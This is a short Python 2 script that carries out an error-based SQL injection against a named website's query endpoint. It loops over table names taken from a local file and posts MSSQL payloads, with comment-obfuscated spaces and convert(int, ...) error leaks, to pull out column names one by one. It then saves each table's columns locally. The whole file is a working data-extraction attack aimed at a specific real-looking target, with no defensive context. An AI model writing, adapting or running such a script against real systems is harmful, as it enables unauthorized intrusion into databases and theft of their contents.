#-*- coding:utf8 -*-
import requests
import os
import sys
reload(sys)
sys.setdefaultencoding( "utf8" )

url='http://www.iuka.cn/chaxun'
base_path='C:/Users/lovebear96/Desktop/hackit/data/'

f1=open(base_path+'tables.txt','r')
table_list=f1.read().replace("', '","'").split("'")[1:-1]

for table in table_list:
	col_names=['null']
	if(not os.path.exists(base_path+table)):
		os.mkdir(base_path+table)
	f2=open(base_path+table+'/'+table+'.txt','w')
	while True:
		con="123'/**/and/**/convert(int,(select/**/top/**/1/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name='"+table+"'/**/and/**/column_name/**/not/**/in('"+"','".join(col_names)+"')))=0-- "
		data={
			'con':con,
			'act':'cha'
		}
		r=requests.post(url,data=data) 
		text=r.content.decode('gbk')
		start=text.find(u'值')
		end=text.find(u'转换')

		new_col=str(text[start+3:end-2])
		if new_col=='' or end==-1:
			break
		col_names.append(new_col)
		start+=len(new_col)+3
	f2.write(str(col_names[1:]))
	f2.close()
f1.close()

